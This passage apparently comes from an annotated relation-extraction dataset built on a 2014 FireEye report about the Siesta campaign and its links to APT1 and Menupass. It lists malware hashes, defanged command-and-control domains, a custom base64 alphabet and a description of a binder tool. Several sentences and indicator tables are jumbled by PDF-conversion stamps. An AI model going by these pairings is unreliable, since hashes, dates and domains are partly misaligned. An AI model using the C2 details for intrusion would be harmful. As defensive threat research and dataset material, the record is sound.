"Attacker"}], [{"name": "Poison Ivy", "pos": [27, 29], "sent_id": 37, "type": "Malware"}], [{"name": "Menupass samples", "pos": [1, 3], "sent_id": 38, "type": "Malware"}], [{"name": "392f15c431c00f049bb1282847d8967f", "pos": [21, 22], "sent_id": 38, "type": "MD5"}], [{"name": "2012-05-16 06:48:02", "pos": [22, 28], "sent_id": 38, "type": "Time"}], [{"name": "army.xxuz.com", "pos": [28, 29], "sent_id": 38, "type": "Indicator"}], [{"name": "21567cce2c26e7543b977a205845ba77", "pos": [0, 1], "sent_id": 39, "type": "MD5"}], [{"name": "2012 06 26 05:17:52", "pos": [0, 4], "sent_id": 40, "type": "Time"}], [{"name": "nasa.xxuz.com", "pos": [0, 1], "sent_id": 41, "type": "Indicator"}], [{"name": "d4b7f99669a3efc94006e5fe9d84eb65", "pos": [1, 2], "sent_id": 41, "type": "MD5"}], [{"name": "2012-07-03 09:33:46", "pos": [2, 8], "sent_id": 41, "type": "Time"}], [{"name": "tw.2012yearleft.com", "pos": [8, 9], "sent_id": 41, "type": "Indicator"}], [{"name": "df5bd411f080b55c578aeb9001a4287d", "pos": [9, 10], "sent_id": 41, "type": "MD5"}], [{"name": "2012-07-04 04:07:36", "pos": [10, 16], "sent_id": 41, "type": "Time"}], [{"name": "apple.cmdnetview.com", "pos": [0, 1], "sent_id": 42, "type": "Indicator"}], [{"name": "001b8f696b6576798517168cd0a0fb44", "pos": [1, 2], "sent_id": 42, "type": "MD5"}], [{"name": "2012 11 13 07:19:03", "pos": [2, 6], "sent_id": 42, "type": "Time"}], [{"name": "google.macforlinux.net", "pos": [0, 1], "sent_id": 43, "type": "Indicator"}], [{"name": "6a3b8d24c125f3a3c7cff526e63297f3", "pos": [1, 2], "sent_id": 43, "type": "MD5"}], [{"name": "2013-02-25 05:31:41", "pos": [2, 8], "sent_id": 43, "type": "Time"}], [{"name": "cvnx.zyns.com", "pos": [8, 9], "sent_id": 43, "type": "Indicator"}], [{"name": "a02610e760fa15c064931cfafb90a9e8", "pos": [9, 10], "sent_id": 43, "type": "MD5"}], [{"name": "2013-08-01 18:23:04", "pos": [10, 16], "sent_id": 43, "type": "Time"}], [{"name": "cvnx.zyns.com", "pos": [16, 17], "sent_id": 43, "type": "Indicator"}], [{"name": "78a4fee0e7b471f733f00c6e7bca3d90", "pos": [17, 18], "sent_id": 43, "type": "MD5"}], [{"name": "2013-08-01 18:23:05", "pos": [18, 24], "sent_id": 43, "type": "Time"}], [{"name": "fbi.sexxxy.biz", "pos": [24, 25], "sent_id": 43, "type": "Indicator"}], [{"name": "6f3d15cf788e28ca504a6370c4ff6a1e", "pos": [25, 26], "sent_id": 43, "type": "MD5"}], [{"name": "2013-09-10 06:40:28", "pos": [26, 32], "sent_id": 43, "type": "Time"}], [{"name": "scrlk.exprenum.com", "pos": [32, 33], "sent_id": 43, "type": "Indicator"}], [{"name": "APT1", "pos": [4, 5], "sent_id": 46, "type": "Attacker"}], [{"name": "Menupass", "pos": [6, 7], "sent_id": 46, "type": "Attacker"}], [{"name": "APT1", "pos": [10, 11], "sent_id": 48, "type": "Attacker"}], [{"name": "Menupass", "pos": [13, 14], "sent_id": 48, "type": "Attacker"}], [{"name": "fb080cef60846528c409f60400f334100a16a5bd77b953c864b23a945fcf26fd", "pos": [17, 18], "sent_id": 59, "type": "SHA-256"}]], "labels": [{"r": "P21", "h": 12, "t": 11, "evidence": [7, 8]}, {"r": "P33", "h": 11, "t": 13, "evidence": [7, 8]}, {"r": "P21", "h": 14, "t": 11, "evidence": [7, 8]}, {"r": "P21", "h": 15, "t": 11, "evidence": [7, 8]}, {"r": "P21", "h": 16, "t": 11, "evidence": [7, 8]}, {"r": "P21", "h": 17, "t": 11, "evidence": [7, 8]}, {"r": "P21", "h": 18, "t": 11, "evidence": [7, 8]}, {"r": "P2", "h": 26, "t": 27, "evidence": [12, 13]}, {"r": "P33", "h": 30, "t": 33, "evidence": [14, 15]}, {"r": "P21", "h": 31, "t": 28, "evidence": [14]}, {"r": "P22", "h": 30, "t": 28, "evidence": [14]}, {"r": "P21", "h": 32, "t": 28, "evidence": [14, 15]}, {"r": "P33", "h": 28, "t": 33, "evidence": [14, 15]}, {"r": "P21", "h": 34, "t": 28, "evidence": [14, 15]}, {"r": "P21", "h": 35, "t": 28, "evidence": [14, 15]}, {"r": "P21", "h": 36, "t": 28, "evidence": [14, 15]}, {"r": "P21", "h": 37, "t": 28, "evidence": [14, 15]}, {"r": "P21", "h": 38, "t": 28, "evidence": [14, 16]}, {"r": "P21", "h": 39, "t": 40, "evidence": [17]}, {"r": "P21", "h": 41, "t": 40, "evidence": [17]}, {"r": "P33", "h": 40, "t": 42, "evidence": [17]}, {"r": "P21", "h": 43, "t": 40, "evidence": [17]}, {"r": "P21", "h": 44, "t": 40, "evidence": [17]}, {"r": "P33", "h": 40, "t": 45, "evidence": [17]}, {"r": "P21", "h": 46, "t": 40, "evidence": [17]}, {"r": "P33", "h": 40, "t": 48, "evidence": [17]}, {"r": "P21", "h": 47, "t": 40, "evidence": [17]}, {"r": "P21", "h": 49, "t": 40, "evidence": [17]}, {"r": "P33", "h": 50, "t": 51, "evidence": [17]}, {"r": "P2", "h": 52, "t": 53, "evidence": [17, 19]}, {"r": "P21", "h": 54, "t": 53, "evidence": [19]}, {"r": "P21", "h": 87, "t": 88, "evidence": [21, 22]}, {"r": "P21", "h": 86, "t": 88, "evidence": [21, 22]}, {"r": "P21", "h": 139, "t": 138, "evidence": [29]}, {"r": "P21", "h": 140, "t": 138, "evidence": [29]}, {"r": "P2", "h": 177, "t": 178, "evidence": [37]}, {"r": "P2", "h": 177, "t": 179, "evidence": [37, 38]}, {"r": "P33", "h": 89, "t": 91, "evidence": [24]}, {"r": "P21", "h": 92, "t": 89, "evidence": [24]}, {"r": "P21", "h": 93, "t": 89, "evidence": [24]}, {"r": "P33", "h": 89, "t": 94, "evidence": [24]}, {"r": "P21", "h": 95, "t": 89, "evidence": [24]}, {"r": "P21", "h": 96, "t": 89, "evidence": [24]}, {"r": "P33", "h": 89, "t": 97, "evidence": [24]}, {"r": "P21", "h": 98, "t": 89, "evidence": [24]}, {"r": "P21", "h": 99, "t": 89, "evidence": [24]}, {"r": "P33", "h": 89, "t": 100, "evidence": [24]}, {"r": "P28", "h": 89, "t": 101, "evidence": [24]}, {"r": "P21", "h": 102, "t": 89, "evidence": [24]}, {"r": "P33", "h": 89, "t": 103, "evidence": [24]}, {"r": "P21", "h": 104, "t": 89, "evidence": [24]}, {"r": "P21", "h": 105, "t": 89, "evidence": [24]}, {"r": "P33", "h": 89, "t": 106, "evidence": [24]}, {"r": "P21", "h": 107, "t": 89, "evidence": [24, 25]}, {"r": "P21", "h": 108, "t": 89, "evidence": [24, 25]}, {"r": "P33", "h": 89, "t": 109, "evidence": [24, 25]}, {"r": "P21", "h": 110, "t": 89, "evidence": [24, 25]}, {"r": "P21", "h": 111, "t": 89, "evidence": [24, 25]}, {"r": "P33", "h": 89, "t": 112, "evidence": [24, 25]}, {"r": "P21", "h": 113, "t": 89, "evidence": [24, 25]}, {"r": "P21", "h": 114, "t": 89, "evidence": [24, 25]}, {"r": "P33", "h": 89, "t": 115, "evidence": [24, 25]}, {"r": "P21", "h": 116, "t": 89, "evidence": [24, 25]}, {"r": "P21", "h": 117, "t": 89, "evidence": [24, 25]}, {"r": "P33", "h": 89, "t": 118, "evidence": [24, 25]}, {"r": "P21", "h": 119, "t": 89, "evidence": [24, 25]}, {"r": "P21", "h": 120, "t": 89, "evidence": [24, 25]}, {"r": "P33", "h": 89, "t": 121, "evidence": [24, 25]}, {"r": "P21", "h": 122, "t": 89, "evidence": [24, 25]}, {"r": "P21", "h": 123, "t": 89, "evidence": [24, 25]}, {"r": "P33", "h": 89, "t": 124, "evidence": [24, 25]}, {"r": "P21", "h": 125, "t": 89, "evidence": [24, 26]}, {"r": "P21", "h": 126, "t": 89, "evidence": [24, 26]}, {"r": "P33", "h": 89, "t": 127, "evidence": [24, 26]}, {"r": "P21", "h": 128, "t": 89, "evidence": [24, 26]}, {"r": "P21", "h": 129, "t": 89, "evidence": [24, 26]}, {"r": "P33", "h": 89, "t": 130, "evidence": [24, 26]}, {"r": "P21", "h": 131, "t": 89, "evidence": [24, 26]}, {"r": "P21", "h": 132, "t": 89, "evidence": [24, 26]}, {"r": "P33", "h": 89, "t": 133, "evidence": [24, 26]}, {"r": "P21", "h": 134, "t": 89, "evidence": [24, 27]}, {"r": "P21", "h": 135, "t": 89, "evidence": [24, 27]}, {"r": "P21", "h": 136, "t": 89, "evidence": [24, 27]}, {"r": "P33", "h": 138, "t": 141, "evidence": [29]}, {"r": "P21", "h": 142, "t": 138, "evidence": [29]}, {"r": "P33", "h": 138, "t": 143, "evidence": [29]}, {"r": "P21", "h": 144, "t": 138, "evidence": [29]}, {"r": "P21", "h": 145, "t": 138, "evidence": [29]}, {"r": "P33", "h": 138, "t": 146, "evidence": [29]}, {"r": "P21", "h": 147, "t": 138, "evidence": [29, 30]}, {"r": "P21", "h": 148, "t": 138, "evidence": [29, 30]}, {"r": "P33", "h": 138, "t": 149, "evidence": [29, 30]}, {"r": "P21", "h": 151, "t": 138, "evidence": [29, 32]}, {"r": "P21", "h": 150, "t": 138, "evidence": [29, 31]}, {"r": "P21", "h": 152, "t": 138, "evidence": [29, 32]}, {"r": "P33", "h": 138, "t": 153, "evidence": [29, 32]}, {"r": "P21", "h": 154, "t": 138, "evidence": [29, 33]}, {"r": "P21", "h": 155, "t": 138, "evidence": [29, 33]}, {"r": "P21", "h": 156, "t": 138, "evidence": [29, 33]}, {"r": "P33", "h": 138, "t": 157, "evidence": [29, 33]}, {"r": "P21", "h": 158, "t": 138, "evidence": [29, 33]}, {"r": "P21", "h": 159, "t": 138, "evidence": [29, 33]}, {"r": "P21", "h": 160, "t": 138, "evidence": [29, 33]}, {"r": "P21", "h": 161, "t": 138, "evidence": [29, 34]}, {"r": "P21", "h": 162, "t": 138, "evidence": [29, 34]}, {"r": "P21", "h": 163, "t": 138, "evidence": [29, 34]}, {"r": "P21", "h": 164, "t": 138, "evidence": [29, 34]}, {"r": "P33", "h": 138, "t": 165, "evidence": [29, 34]}, {"r": "P33", "h": 138, "t": 166, "evidence": [29, 35]}, {"r": "P33", "h": 138, "t": 167, "evidence": [29, 35]}, {"r": "P33", "h": 138, "t": 168, "evidence": [29, 35]}, {"r": "P33", "h": 138, "t": 169, "evidence": [29, 35]}, {"r": "P33", "h": 138, "t": 170, "evidence": [29, 35]}, {"r": "P21", "h": 171, "t": 138, "evidence": [29, 35]}, {"r": "P21", "h": 172, "t": 138, "evidence": [29, 35]}, {"r": "P21", "h": 173, "t": 138, "evidence": [29, 35]}, {"r": "P21", "h": 174, "t": 138, "evidence": [29, 35]}, {"r": "P21", "h": 175, "t": 138, "evidence": [29, 35]}, {"r": "P21", "h": 176, "t": 138, "evidence": [29, 35]}, {"r": "P21", "h": 180, "t": 138, "evidence": [29, 38]}, {"r": "P33", "h": 179, "t": 181, "evidence": [38]}, {"r": "P21", "h": 182, "t": 179, "evidence": [38]}, {"r": "P21", "h": 183, "t": 179, "evidence": [38, 39]}, {"r": "P33", "h": 179, "t": 184, "evidence": [38, 40]}, {"r": "P21", "h": 185, "t": 179, "evidence": [38, 41]}, {"r": "P21", "h": 186, "t": 179, "evidence": [38, 41]}, {"r": "P33", "h": 179, "t": 187, "evidence": [38, 41]}, {"r": "P21", "h": 188, "t": 179, "evidence": [38, 41]}, {"r": "P21", "h": 189, "t": 179, "evidence": [38, 41]}, {"r": "P33", "h": 179, "t": 190, "evidence": [38, 41]}, {"r": "P21", "h": 191, "t": 179, "evidence": [38, 42]}, {"r": "P21", "h": 192, "t": 179, "evidence": [38, 42]}, {"r": "P33", "h": 179, "t": 193, "evidence": [38, 42]}, {"r": "P21", "h": 194, "t": 179, "evidence": [38, 43]}, {"r": "P21", "h": 195, "t": 179, "evidence": [38, 43]}, {"r": "P33", "h": 179, "t": 196, "evidence": [38, 43]}, {"r": "P21", "h": 197, "t": 179, "evidence": [38, 43]}, {"r": "P21", "h": 198, "t": 179, "evidence": [38, 43]}, {"r": "P33", "h": 179, "t": 199, "evidence": [38, 43]}, {"r": "P21", "h": 200, "t": 179, "evidence": [38, 43]}, {"r": "P21", "h": 201, "t": 179, "evidence": [38, 43]}, {"r": "P33", "h": 179, "t": 202, "evidence": [38, 43]}, {"r": "P21", "h": 203, "t": 179, "evidence": [38, 43]}, {"r": "P21", "h": 204, "t": 179, "evidence": [38, 43]}, {"r": "P33", "h": 179, "t": 205, "evidence": [38, 43]}, {"r": "P21", "h": 206, "t": 179, "evidence": [38, 43]}], "title": "201403FireEyeSiesta", "sents": [["Solutions", "Services", "Partners", "Support", "Resources", "Company", "Home", "\ue93c", "FireEye", "Blogs", "\ue93c", "Threat", "Research", "\ue93c", "March", "2014", "Threat", "Research", "Blog", "Posts", "\ue93c", "A", "D", "e", "tai", "l", "e", "d", "Exami", "n", "ati", "on", "of", "th", "e", "Si", "e", "sta", "Campai", "gn", "A", "Detailed", "Examination", "of", "the", "Siesta", "Campaign"], ["March", "12", ",", "2014", "|", "by", "Ned", "Moran", ",", "Mike", "Oppenheim", "Executive", "Summary", "FireEye", "recently", "looked", "deeper", "into", "the", "activity", "discussed", "in", "TrendMicro", "\u2019s", "blog", "and", "dubbed", "the", "\u201c", "Siesta", "\u201d", "campaign", "."], ["The", "tools", ",", "modus", "operandi", ",", "and", "infrastructure", "used", "in", "the", "campaign", "present", "two", "possibilities", ":", "either", "the", "Chinese", "cyber", "-", "espionage", "unit", "APT1", "is", "perpetrating", "this", "activity", ",", "or", "another", "group", "is", "using", "the", "same", "tactics", "and", "tools", "as", "the", "legacy", "APT1", "."], ["The", "Siesta", "campaign", "reinforces", "the", "fact", "that", "analysts", "and", "network", "defenders", "should", "remain", "on", "the", "lookout", "for", "known", ",", "public", "indicators", "and", "for", "shared", "attributes", "that", "allow", "security", "experts", "to", "detect", "multiple", "actors", "with", "one", "signature", "."], ["Overview"], ["On", "March", "6", ",", "2014", "TrendMicro", "reported", "on", "the", "Siesta", "Campaign", "."], ["Though", "not", "explicitly", "stated", "in", "this", "report", ",", "the", "tactics", ",", "techniques", "and", "procedures", "(", "TTPs", ")", "described", "in", "this", "report", "share", "a", "number", "of", "characteristics", "with", "historical", "activity", "we", "\u2019ve", "attributed", "to", "APT1", "(", "also", "known", "as", "the", "\u201c", "Comment", "Crew", "\u201d", ")", "."], ["We", "witnessed", "this", "same", "campaign", "targeting", "a", "customer", "in", "the", "telecommunications", "sector", "on", "Feb.", "20", ",", "2014", ",", "using", "a", "spear", "-", "phishing", "message", "with", "a", "link", "to", "PDFmyURL", "-", "online", "url", "to", "pdf", "conversion", "\ue922", "ifuedit[.]net", "/", "Healthcare_Questionnaire.zip", "."], ["This", "zip", "file", "contained", "a", "malicious", "executable", "with", "the", "following", "properties", ":", "M", "D5", "61249bf64fa270931570b8a5eba06afa", "Compile", "Time", "2014", "-", "02", "-", "20", "02:28:21", ".text", "39e9e4eac77a09b915626f315b963a4f", ".rdata", "a126c8c7c50bf034f2d3ba4aa5bcab28", ".data", "bb95154b5aeb13a4ff937afa2e7e4560", ".rsrc", "edf3a1e142fc212da11dc72698184ad5", "Import", "Hash", "20ff5087740eabff5bdbdf99d9fb6853"], ["This", "sample", "initiated", "a", "callback", "to", "www[.]microsofthomes[.]com", "/", "index.html", "."], ["This", "same", "import", "hash", "was", "seen", "in", "the", "following", "samples", ":", "M", "D5", "Compile", "Time", "Command", "-", "and", "-", "Control", "(", "CnC", ")", "server", "68f73d81c814ab2f70eed02c0be3b67d", "2014", "-", "02", "-", "20", "02:26:24"], ["www[.]microsofthomes[.]com", "20b124baaaec1e8cbc3cd52e8e5ceebd", "2014", "-", "02", "-", "20", "02:26:24", "www[.]microsofthomes[.]com", "PDFmyURL", "-", "online", "url", "to", "pdf", "conversion", "Techniques", ",", "tactics", ",", "and", "procedures", "analysis"], ["The", "TTPs", "described", "above", "are", "consistent", "with", "APT1", "."], ["This", "group", "previously", "relied", "on", "establishing", "a", "foothold", "in", "targeted", "networks", "with", "following", "methods", ":", "Spear", "-", "phishing", "emails", "with", "links", "to", "archives", "Callback", "traffic", "to", "a", "legitimate", "-", "looking", "webpage", "Analysis", "of", "Related", "Samples"], ["A", "related", "dropper", "listed", "in", "the", "TrendMicro", "report", "on", "the", "Siesta", "campaign", "is", "MD5", "0f3031412d255336a102bbc1dcd43812", "."], ["This", "sample", "had", "the", "following", "properties", ":", "M", "D5", "0f3031412d255336a102bbc1dcd43812", "Compile", "Time", "2014", "-", "02", "-", "19", "09:29:04", ".text", "a2e11e9c8b07888345d6cdf7d995b832", ".rdata", "0203cc3bb607e9cfa296fa857b243468", ".data", "7d281bd27bc1279428bd1798671eb57b", ".rsrc", "caa869fa01ddfee26156166a10c42944"], ["Import", "Hash", "0fefba40443edd57f816502035077e3e"], ["The", "import", "hash", "of", "0fefba40443edd57f816502035077e3e", "is", "in", "other", "samples", "linked", "to", "the", "Siesta", "campaign", "including", ":", "M", "D5", "643654975b63a9bb6f597502e5cd8f49", "PDFmyURL", "-", "online", "url", "to", "pdf", "conversion", "Compile", "Time", "2014", "-", "01", "-", "14", "04:38:30", "CnC", "www[.]cloudcominc[.]com", "643654975b63a9bb6f597502e5cd8f49", "2014", "-", "01", "-", "14", "04:38:30", "www[.]cloudcominc[.]com", "0f3031412d255336a102bbc1dcd43812", "2014", "-", "02", "-", "19", "09:29:04", "www[.]skyslisten[.]com", "The", "import", "hash", "from", "this", "dropper", "was", "also", "seen", "in", "a", "number", "of", "previous", "APT1", "samples", "dating", "as", "far", "back", "as", "2011", "\u2014", "well", "before", "the", "release", "of", "the", "APT1", "report", "."], ["We", "previously", "discussed", "the", "value", "of", "tracking", "via", "import", "hashing", "here", "."], ["Other", "APT1", "samples", "with", "this", "same", "import", "hash", "include", "(", "but", "are", "not", "limited", "to", "):", "M", "D5", "Compile", "Time", "CnC", "719453b4da6d3814604c84a28d4d1f4c", "2011", "-", "06", "-", "16", "12:54:20", "www[.]stapharrest[.]com", "93a6e9a26924a5cdab8ed47cadbe88d5", "2012", "-", "01", "-", "18", "13:35:54", "www[.]offerdahls[.]com", "c2aadd6a69a775602d984af64eaeda96", "2012", "-", "05", "-", "15", "09:02:25"], ["www[.]bluecoate[.]com", "1df0b937239473df0187063392dae028", "2012", "-", "06", "-", "20", "09:25:31", "www[.]billyjoebobshow[.]com", "55065f1b341e5b095b6d453923d5654d", "2012", "-", "07", "-", "12", "09:21:17", "184.82.164.104", "65502e91e3676cf30778a7078f1061de", "2012", "-", "07", "-", "19", "09:31:42", "www[.]billyjoebobshow[.]com", "287113e4423813efd242af8e6255f680", "2012", "-", "07", "-", "24", "05:53:22", "thales[.]myftp[.]info", "d613d40d5402f58d8952da2c24d1a769", "2012", "-", "09", "-", "27", "12:46:20", "www[.]billyjoebobshow", "[", "57a4c6236b4ecf96d31258e5cc6f0ae4", "2013", "-", "01", "-", "07", "07:43:14", "manslist[.]loopback[.]nu", "e5a4ec0519c471b5be093aee5c33b1ee", "2013", "-", "01", "-", "08", "07:34:59", "www[.]whackcard[.]com", "PDFmyURL", "-", "online", "url", "to", "pdf", "conversion", "f822a9e08b51c19a154dfb63ee9b8367", "2013", "-", "01", "-", "10", "07:50:58"], ["technology[.]acmetoy[.]com", "Further", ",", "the", "0f3031412d255336a102bbc1dcd43812", "sample", "dropped", "a", "backdoor", "with", "the", "MD5", "hash", "185e930a19ad1a99c226d59ef563e28c", "."], ["This", "implant", "was", "stored", "as", "a", "resource", "within", "the", "dropper", ",", "and", "it", "contained", "a", "custom", "base64", "alphabet", "of", "oWXYZabcdefghijkl123456789ABCDEFGHIJKL+/MNOPQRSTUVmn0pqrstuvwxyz", "."], ["This", "custom", "alphabet", "was", "used", "by", "the", "malware", "to", "decode", "commands", "issued", "by", "the", "attacker", "to", "the", "victim", "machine", "and", "to", "Base64", "encode", "the", "reverse", "shell", "from", "the", "victims", "back", "to", "the", "CnC", "server", "."], ["This", "same", "custom", "alphabet", "has", "been", "used", "in", "previous", "APT1", "samples", "including", "(", "but", "not", "limited", "to", "):", "M", "D5", "Compile", "Time", "CnC", "736ebc9b8ece410aaf4e8b60615f065f", "2003", "-", "05", "-", "15", "08:58:48", "www[.]comtoway[.]com", "ac87816b9a371e72512d8fd82f61c737", "2006", "-", "09", "-", "14", "02:28:46", "www[.]mwa[.]net", "173cd315008897e56fa812f2b2843f83", "2006", "-", "09", "-", "14", "02:28:46", "www[.]deebeedesigns[.]ca", "513644c57688b70860d0b9aa1b6cd0d7", "2010", "-", "12", "-", "17", "03:24:13", "69.90.65.240", "fdf6bf1973af8ab130fbcaa0914b4b06", "2012", "-", "05", "-", "10", "08:41:35", "www[.]woodagency[.]com", "682bfed6332e210b4f3a91e5e8a1410b", "2012", "-", "05", "-", "15", "03:17:04"], ["www[.]oewarehouse[.]com", "fb7a74a88eead4d39a58cc7b6eede4ce", "2013", "-", "08", "-", "01", "18:23:07", "www[.]mwa[.]net", "Executable", "(", "PE", ")", "resource", "with", "PDF", "icon", "Table", "M", "D5", "PDFmyURL", "-", "online", "url", "to", "pdf", "conversion", "Compile", "Time", "CnC", "M", "D5", "Compile", "Time", "CnC", "719453b4da6d3814604c84a28d4d1f4c", "2011", "-", "06", "-", "16", "12:54:20", "www[.]drgeorges[.]com", "854cb8ba3b2d3058239a7ba6a427944a", "2011", "-", "08", "-", "17", "00:31:27", "meeting[.]toh[.]info", "a049b8ec51c0255dec734c7ba5641af3", "2011", "-", "08", "-", "17", "00:31:27", "meeting[.]toh[.]info", "0725a1819a58e988b939f06e53990254", "2011", "-", "08", "-", "17", "00:31:27", "google.ninth.biz", "0fdffd4f5730bdd37f2f082bf396064a", "2011", "-", "08", "-", "11", "09:35:24"], ["homepage[.]longmusic[.]com", "e476e4a24f8b4ff4c8a0b260aa35fc9f", "2012", "-", "06", "-", "09", "13:19:49", "www[.]heliospartners[.]com", "d613d40d5402f58d8952da2c24d1a769", "2012", "-", "09", "-", "27", "12:46:20", "www[.]billyjoebobshow[.]com", "f822a9e08b51c19a154dfb63ee9b8367", "2013", "-", "01", "-", "10", "07:50:58"], ["technology[.]acmetoy[.]com", "Both", "61249bf64fa270931570b8a5eba06afa", "and", "0f3031412d255336a102bbc1dcd43812", "droppers", "also", "had", "a", "portable", "executable", "(", "PE", ")", "resource", "with", "the", "SHA256", "of", "fb080cef60846528c409f60400f334100a16a5bd77b953c864b23a945fcf26fd", "."], ["This", "PE", "resource", "contained", "the", "PDF", "icon", "used", "by", "the", "dropper", "to", "make", "the", "executable", "appear", "as", "though", "it", "was", "a", "PDF", "document", "rather", "than", "an", "executable", "."], ["Previous", "APT1", "samples", "also", "used", "this", "sample", "PE", "resource", "including", "(", "but", "not", "limited", "to", "):", "M", "D5", "1aab2040ed4f918e1823e2caf645a81d", "8ee2cf05746bb0a009981fdb90f1343e", "PDFmyURL", "-", "online", "url", "to", "pdf", "conversion", "Compile", "Time", "CnC", "2009", "-", "09", "-", "28", "22:08:38", "www[.]olmusic100[.]com", "2010", "-", "03", "-", "15", "gogotrade[.]apple.org[.]ru", "8ee2cf05746bb0a009981fdb90f1343e", "11:46:31"], ["tradeproject[.]rlogin[.]org", "9c4617793984c4b08d75b00f1562cbda", "2010", "-", "08", "-", "31", "03:27:55"], ["freetrade[.]allowed[.]org"], ["worldwide[.]chickenkiller[.]com", "b584b48d401e98f404584c330489895c", "2010", "-", "08", "-", "31", "07:52:17"], ["worldwide[.]chickenkiller[.]com", "freetrade[.]allowed[.]org", "b92a53fc409d175c768581978f1d3331", "2010", "-", "09", "-", "16", "09:57:09", "www[.]rbaparts[.]com", "d6c19be4e9e1ae347ee269d15cb96a51", "d0a7cd5cd7da9024fb8bd594d37d7594"], ["b19ef1134f54b4021f99cc45ae1bc270", "b0a95c47d170baad8a5594e0f755e0c1", "894ef915af830f38499d498342fdd8db", "c2aadd6a69a775602d984af64eaeda96", "2010", "-", "10", "-", "25", "01:59:00"], ["2011", "-", "04", "-", "20", "07:39:01", "2011", "-", "06", "-", "13", "06:56:04", "2012", "-", "03", "-", "26", "06:50:10", "2012", "-", "03", "-", "26", "07:13:36", "2012", "-", "05", "-", "15", "09:02:25", "www[.]kayauto[.]net", "www[.]kayauto[.]net", "www[.]kayauto[.]net", "www[.]coachmotor[.]com", "www[.]rightnowautoparts[.]com", "www[.]bluecoate[.]com", "Links", "to", "other", "Activity"], ["This", "same", "PE", "resource", "was", "also", "used", "in", "a", "number", "of", "other", "samples", "deployed", "by", "the", "PDFmyURL", "-", "online", "url", "to", "pdf", "conversion"], ["This", "same", "PE", "resource", "was", "also", "used", "in", "a", "number", "of", "other", "samples", "deployed", "by", "the", "\u201c", "Menupass", "\u201d", "group", ",", "which", "we", "have", "detailed", "in", "our", "Poison", "Ivy", "report", "."], ["Previous", "Menupass", "samples", "with", "this", "same", "PE", "resource", "include", "(", "but", "are", "not", "limited", "to", "):", "M", "D5", "Compile", "Time", "CnC", "392f15c431c00f049bb1282847d8967f", "2012", "-", "05", "-", "16", "06:48:02", "army.xxuz.com"], ["21567cce2c26e7543b977a205845ba77"], ["2012", "06", "26", "05:17:52"], ["nasa.xxuz.com", "d4b7f99669a3efc94006e5fe9d84eb65", "2012", "-", "07", "-", "03", "09:33:46", "tw.2012yearleft.com", "df5bd411f080b55c578aeb9001a4287d", "2012", "-", "07", "-", "04", "04:07:36"], ["apple.cmdnetview.com", "001b8f696b6576798517168cd0a0fb44", "2012", "11", "13", "07:19:03"], ["google.macforlinux.net", "6a3b8d24c125f3a3c7cff526e63297f3", "2013", "-", "02", "-", "25", "05:31:41", "cvnx.zyns.com", "a02610e760fa15c064931cfafb90a9e8", "2013", "-", "08", "-", "01", "18:23:04", "cvnx.zyns.com", "78a4fee0e7b471f733f00c6e7bca3d90", "2013", "-", "08", "-", "01", "18:23:05", "fbi.sexxxy.biz", "6f3d15cf788e28ca504a6370c4ff6a1e", "2013", "-", "09", "-", "10", "06:40:28", "scrlk.exprenum.com", "Shared", "Tools"], ["This", "shared", "PE", "resource", "between", "what", "is", "believed", "to", "be", "two", "distinct", "groups", "(", "likely", "APT1", ",", "and", "Menupass", ")", "can", "be", "explained", "by", "either", "of", "the", "following", ":", "APT1", "and", "Menupass", "are", "actually", "one", "and", "the", "same", "APT1", "and", "Menupass", "share", "\u201c", "binder", "\u201d", "tools", "unlikely", "that", "and", "Menupass", "represent", "the", "same", "group", "."], ["We", "have", "observed", "no", "PDFmyURLIt", "-", "is", "online", "url", "to", "pdf", "APT1", "conversion"], ["It", "is", "unlikely", "that", "APT1", "and", "Menupass", "represent", "the", "same", "group", "."], ["We", "have", "observed", "no", "other", "overlaps", "in", "infrastructure", "or", "tools", "between", "these", "two", "groups", "."], ["A", "more", "likely", "possibility", "is", "that", "the", "shared", "resource", "between", "APT1", "and", "the", "Menupass", "group", "is", "a", "binder", "tool", "."], ["A", "binder", "tool", "enables", "a", "malicious", "actor", "to", "add", "an", "innocuous", "-", "looking", "icon", ",", "such", "as", "a", "PDF", "document", "icon", ",", "to", "a", "malicious", "dropper", "."], ["This", "technique", "facilitates", "social", "engineering", ",", "presenting", "the", "end", "user", "with", "a", "file", "that", "looks", "like", "a", "PDF", "document", "rather", "than", "an", "executable", "."], ["Figure", "1", "shows", "a", "builder", "that", "enables", "actors", "to", "bind", "a", "JPG", "image", "icon", "to", "a", "malicious", "executable", "."], ["Figure", "1", ":", "Binder", "tool", "for", "disguising", "executable", "files", "as", "JPGs", "Attribution", "onurl", "the", "provided", ",", "the", "following", "are", "possibilities", ":", "PDFmyURLBased", "-", "online", "to", "evidence", "pdf", "conversion", "Based", "on", "the", "evidence", "provided", ",", "the", "following", "are", "possibilities", ":"], ["The", "Siesta", "campaign", "was", "executed", "by", "APT1", "An", "unknown", "group", "using", "tools", "and", "tactics", "shared", "by", "APT1", "executed", "the", "Siesta", "campaign"], ["Although", "we", "are", "not", "certain", "that", "APT1", "is", "responsible", "for", "the", "Siesta", "activity", ",", "this", "current", "campaign", "shares", "a", "number", "of", "distinct", "characteristics", "with", "previous", "activity", "attributed", "to", "APT1", "."], ["So", "What", "?"], ["Regardless", "of", "which", "group", "is", "responsible", "for", "this", "campaign", ",", "our", "analysis", "highlights", "the", "importance", "of", "monitoring", "for", "known", "indicators", "."], ["As", "shown", "above", ",", "monitoring", "for", "previously", "disclosed", "indicators", "of", "compromise", "(", "IOCs", ")", ",", "even", "IOCs", "that", "are", "years", "old", ",", "can", "yield", "value", "."], ["Additionally", ",", "monitoring", "for", "IOCs", "and", "attributes", "of", "malware", "that", "are", "shared", "by", "multiple", "groups", "may", "also", "improve", "the", "effectiveness", "of", "your", "network", "defense", "operations", "."], ["In", "this", "example", ",", "implementing", "detection", "for", "executables", "with", "a", "PE", "resource", "with", "a", "SHA256", "hash", "of", "fb080cef60846528c409f60400f334100a16a5bd77b953c864b23a945fcf26fd", "would", "detect", "both", "Menupass", "and", "APT1", "samples", "."], ["This", "entry", "was", "posted", "on", "We", "d", "Mar", "12", "19:57", "EDT", "2014", "and", "filed", "under", "Ned", "Moran", "and", "Mike", "Oppenheim", "."], ["PDFmyURL", "-", "online", "url", "to", "pdf", "conversion", "Sign", "up", "for", "email", "updates"], ["Get", "information", "and", "insight", "on", "today", "'s", "advanced", "threats", "from", "the", "leader", "in", "advanced", "threat", "prevention", "."], ["First", "Name", "Last", "Name", "Email", "Address"], ["Company", "Name", "Threat", "Research", "Blog", "Products", "and", "Services", "Blog", "Executive", "Perspectives", "Blog", "SUBSCRIBE", "PDFmyURL", "-", "online", "url", "to", "pdf", "conversion", "Compan", "y", "N", "ew", "s", 